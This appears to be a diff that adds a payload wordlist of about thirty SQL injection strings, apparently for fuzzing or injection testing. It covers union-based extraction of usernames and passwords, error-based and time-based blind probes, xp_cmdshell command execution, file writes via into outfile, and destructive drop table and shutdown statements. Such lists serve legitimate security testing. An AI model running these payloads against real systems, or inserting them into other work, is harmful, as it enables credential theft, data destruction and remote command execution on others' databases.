@@ -1,0 +1,30 @@
+1 union select pass from users--
+1' /*!50000union*/ /*!50000select*/ username,password from users-- -
+admin'/**/OR/**/1=1/**/#
+1 and extractvalue(1,concat(0x7e,(select user())))
+1' and updatexml(1,concat(0x7e,user()),1)#
+1 waitfor delay '0:0:5'--
+1;exec master..xp_cmdshell 'dir'
+1 or '1'='1
+1 || (select count(*) from information_schema.tables)
+' union select 1,2,3 into outfile '/tmp/x'-- -
+1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+1 and json_extract('{}','$.a')
+1e0 from (select 1)e union select 2
+-1' and (select 1 from (select sleep(5))a)--
+x'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+TABLE information_schema.tables
+;drop table users;
+1);declare @s varchar(99);set @s=(select @@version);exec(@s)--
+null' order by 100--
+') or 1=1--
+1 and bitand(1,1)=1
+1 and (select 1 and row(1,1)>(select count(*),concat(version(),floor(rand(0)*2))x from users group by x limit 1))
+-1 union all select null,null,null--
+1' and '1'='1
+99999 or 1=1;--
+1 and ord(mid(user(),1,1))>64
+1 or pg_sleep(10) is not null--
+';shutdown--
+1 and charset(user()) like 'utf8%
+foo'+'bar
